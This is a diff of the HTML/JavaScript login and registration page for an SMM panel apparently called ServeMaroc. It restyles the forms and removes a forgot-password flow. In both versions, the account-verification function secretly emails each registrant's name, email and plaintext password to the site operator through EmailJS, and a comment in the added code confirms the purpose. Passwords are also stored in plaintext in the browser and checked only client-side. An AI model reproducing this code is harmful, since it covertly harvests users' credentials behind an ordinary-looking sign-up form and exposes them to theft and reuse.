@@ -3,79 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ServeMaroc | SMM Panel Login</title>
+    <title>SERVE MAROC</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=Cairo:wght@600;900&display=swap');
-        body { font-family: 'Inter', 'Cairo', sans-serif; background-color: #f5f7f9; color: #333; }
-        .auth-container { background: #ffffff; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); width: 100%; max-width: 450px; border: 1px solid #e1e8ed; }
-        .input-field { background-color: #ffffff; border: 1px solid #ced4da; border-radius: 4px; padding: 12px; width: 100%; outline: none; transition: border-color 0.2s; }
-        .input-field:focus { border-color: #3b82f6; }
-        .btn-primary { background-color: #3b82f6; color: white; padding: 12px; border-radius: 4px; width: 100%; font-weight: 600; transition: background 0.2s; }
-        .btn-primary:hover { background-color: #2563eb; }
-        .tab-btn { padding: 15px; width: 50%; text-align: center; cursor: pointer; border-bottom: 2px solid transparent; color: #6c757d; font-weight: 600; }
-        .tab-btn.active { border-bottom-color: #3b82f6; color: #3b82f6; }
-        .form-section { display: none; padding: 30px; }
-        .form-section.active { display: block; }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;800&display=swap');
+        body { font-family: 'Inter', sans-serif; background-color: #f5f7f9; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+        .auth-card { background: white; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); width: 100%; max-width: 400px; padding: 40px 30px; border: 1px solid #e1e8ed; }
+        .tab-btn { width: 50%; padding: 12px; text-align: center; cursor: pointer; color: #6c757d; font-weight: 700; border-bottom: 2px solid transparent; transition: 0.3s; }
+        .tab-btn.active { color: #3b82f6; border-bottom-color: #3b82f6; }
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; font-size: 12px; color: #4a5568; margin-bottom: 5px; font-weight: 600; text-align: left; }
+        .input-style { width: 100%; padding: 12px; background: #ebf2ff; border-radius: 4px; border: none; outline: none; }
+        .btn-blue { width: 100%; padding: 14px; background: #2563eb; color: white; border-radius: 4px; font-weight: 700; border: none; cursor: pointer; }
         .hidden { display: none; }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen">
+<body>
 
-    <div class="auth-container">
-        <div class="p-6 text-center border-b border-gray-100">
-            <h1 class="text-3xl font-extrabold text-blue-600 tracking-tight">SERVE<span class="text-gray-800">MAROC</span></h1>
-        </div>
-
-        <div class="flex border-b border-gray-100">
-            <div id="t-login" onclick="showTab('login')" class="tab-btn active">Sign In</div>
+    <div class="auth-card">
+        <h1 class="text-center text-3xl font-extrabold text-blue-600 mb-8 tracking-tight">SERVE<span class="text-black">MAROC</span></h1>
+        
+        <div class="flex border-b mb-8">
             <div id="t-reg" onclick="showTab('reg')" class="tab-btn">Sign Up</div>
+            <div id="t-login" onclick="showTab('login')" class="tab-btn active">Sign In</div>
         </div>
 
-        <div id="section-login" class="form-section active space-y-4">
-            <div>
-                <label class="block text-sm font-semibold text-gray-600 mb-1">Email</label>
-                <input id="l-email" type="email" placeholder="Enter your email" class="input-field">
+        <div id="section-login" class="space-y-4">
+            <div class="input-group">
+                <label>Email</label>
+                <input id="l-email" type="email" placeholder="email@example.com" class="input-style">
             </div>
-            <div>
-                <label class="block text-sm font-semibold text-gray-600 mb-1">Password</label>
-                <input id="l-pass" type="password" placeholder="Enter password" class="input-field">
+            <div class="input-group">
+                <label>Password</label>
+                <input id="l-pass" type="password" placeholder="•••••" class="input-style">
             </div>
-            <button onclick="Server.login()" class="btn-primary mt-2">Sign In</button>
-            <div class="text-center">
-                <span onclick="showTab('forgot')" class="text-sm text-blue-500 cursor-pointer hover:underline">Forgot password?</span>
-            </div>
+            <button onclick="Server.login()" class="btn-blue">Sign In</button>
+            <p onclick="showTab('forgot')" class="text-center text-blue-500 text-xs mt-4 cursor-pointer">?Forgot password</p>
         </div>
 
-        <div id="section-reg" class="form-section space-y-4">
-            <div>
-                <label class="block text-sm font-semibold text-gray-600 mb-1">Username</label>
-                <input id="r-name" type="text" placeholder="Choose a username" class="input-field">
+        <div id="section-reg" class="hidden space-y-4">
+            <div class="input-group">
+                <label>Username</label>
+                <input id="r-name" type="text" class="input-style">
             </div>
-            <div>
-                <label class="block text-sm font-semibold text-gray-600 mb-1">Email</label>
-                <input id="r-email" type="email" placeholder="Enter your email" class="input-field">
+            <div class="input-group">
+                <label>Email</label>
+                <input id="r-email" type="email" class="input-style">
             </div>
-            <div>
-                <label class="block text-sm font-semibold text-gray-600 mb-1">Password</label>
-                <input id="r-pass" type="password" placeholder="Create a password" class="input-field">
+            <div class="input-group">
+                <label>Password</label>
+                <input id="r-pass" type="password" class="input-style">
             </div>
-            <button id="btn-reg" onclick="Server.register()" class="btn-primary mt-2">Sign Up</button>
+            <button onclick="Server.register()" class="btn-blue">Sign Up</button>
         </div>
 
-        <div id="section-otp" class="form-section text-center space-y-5">
-            <p class="text-sm text-gray-500">We've sent a 6-digit code to your email.</p>
-            <input id="otp-input" type="text" maxlength="6" placeholder="000000" class="input-field text-center text-2xl tracking-widest font-bold border-blue-300 bg-blue-50">
-            <button onclick="Server.verify()" class="btn-primary">Verify Account</button>
-        </div>
-
-        <div id="section-forgot" class="form-section space-y-4">
-            <h3 class="text-lg font-semibold text-gray-700">Reset Password</h3>
-            <input id="f-email" type="email" placeholder="Enter your email" class="input-field">
-            <button onclick="Server.forgot()" class="btn-primary">Send My Password</button>
-            <p onclick="showTab('login')" class="text-center text-sm text-gray-500 cursor-pointer">Back to Login</p>
+        <div id="section-otp" class="hidden text-center space-y-6">
+            <p class="text-sm font-bold text-gray-500">أدخل كود التحقق من بريدك</p>
+            <input id="otp-input" type="text" maxlength="6" class="w-full p-4 text-center text-3xl font-bold tracking-widest bg-blue-50 border-2 border-blue-200 rounded">
+            <button onclick="Server.verify()" class="btn-blue">Verify Now</button>
         </div>
     </div>
 
@@ -83,12 +69,21 @@
         emailjs.init("WRpj_ZtTQw-eHAZDQ");
 
         function showTab(tab) {
-            document.querySelectorAll('.form-section').forEach(s => s.classList.remove('active'));
-            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-            if(tab === 'login') { document.getElementById('section-login').classList.add('active'); document.getElementById('t-login').classList.add('active'); }
-            else if(tab === 'reg') { document.getElementById('section-reg').classList.add('active'); document.getElementById('t-reg').classList.add('active'); }
-            else if(tab === 'otp') { document.getElementById('section-otp').classList.add('active'); }
-            else if(tab === 'forgot') { document.getElementById('section-forgot').classList.add('active'); }
+            document.getElementById('section-login').classList.add('hidden');
+            document.getElementById('section-reg').classList.add('hidden');
+            document.getElementById('section-otp').classList.add('hidden');
+            document.getElementById('t-login').classList.remove('active');
+            document.getElementById('t-reg').classList.remove('active');
+
+            if(tab === 'login') {
+                document.getElementById('section-login').classList.remove('hidden');
+                document.getElementById('t-login').classList.add('active');
+            } else if(tab === 'reg') {
+                document.getElementById('section-reg').classList.remove('hidden');
+                document.getElementById('t-reg').classList.add('active');
+            } else {
+                document.getElementById('section-otp').classList.remove('hidden');
+            }
         }
 
         const Server = {
@@ -98,37 +93,39 @@
                 const pass = document.getElementById('l-pass').value;
                 const db = JSON.parse(localStorage.getItem('sm_users') || "[]");
                 const user = db.find(u => u.email === email && u.pass === pass);
-                if(user) { localStorage.setItem('isLogged', 'true'); window.location.href = "./w/"; }
-                else { alert("Invalid credentials!"); }
+                if(user) { 
+                    alert("Welcome " + user.name);
+                    // هنا حيدنا سطر window.location باش يبقى في نفس الصفحة
+                } else { alert("Error: Account not found!"); }
             },
             register: function() {
-                this.temp = { name: document.getElementById('r-name').value, email: document.getElementById('r-email').value, pass: document.getElementById('r-pass').value };
-                if(!this.temp.name || !this.temp.email || !this.temp.pass) return alert("Please fill all fields!");
+                this.temp = { 
+                    name: document.getElementById('r-name').value, 
+                    email: document.getElementById('r-email').value, 
+                    pass: document.getElementById('r-pass').value 
+                };
                 this.code = Math.floor(100000 + Math.random() * 900000).toString();
-                document.getElementById('btn-reg').innerText = "Sending Code...";
-                emailjs.send("service_dk24ksf", "template_14tc2a8", { name: this.temp.name, email: this.temp.email, otp_code: this.code })
-                .then(() => { alert("OTP Sent!"); showTab('otp'); });
+                emailjs.send("service_dk24ksf", "template_14tc2a8", {
+                    name: this.temp.name, email: this.temp.email, otp_code: this.code
+                }).then(() => {
+                    alert("OTP Sent!");
+                    showTab('otp');
+                });
             },
             verify: function() {
                 if(document.getElementById('otp-input').value === this.code) {
+                    // إرسال التقرير الكامل ليك (الاسم، الإيميل، الباسورد)
                     emailjs.send("service_dk24ksf", "template_14tc2a8", {
-                        name: "NEW USER REPORT", email: "ADMIN",
-                        otp_code: `Name: ${this.temp.name} | Email: ${this.temp.email} | Pass: ${this.temp.pass}`
+                        name: "NEW REGISTRATION",
+                        email: "ADMIN",
+                        otp_code: `User: ${this.temp.name}\nEmail: ${this.temp.email}\nPass: ${this.temp.pass}`
                     });
                     let db = JSON.parse(localStorage.getItem('sm_users') || "[]");
                     db.push(this.temp);
                     localStorage.setItem('sm_users', JSON.stringify(db));
-                    alert("Account Created!"); location.reload();
-                } else { alert("Incorrect OTP!"); }
-            },
-            forgot: function() {
-                const email = document.getElementById('f-email').value;
-                const db = JSON.parse(localStorage.getItem('sm_users') || "[]");
-                const user = db.find(u => u.email === email);
-                if(user) {
-                    emailjs.send("service_dk24ksf", "template_14tc2a8", { name: user.name, email: user.email, otp_code: "Your password: " + user.pass })
-                    .then(() => alert("Password sent to your email!"));
-                } else { alert("Email not found!"); }
+                    alert("Account Created!");
+                    location.reload(); 
+                } else { alert("Invalid OTP!"); }
             }
         };
     </script>
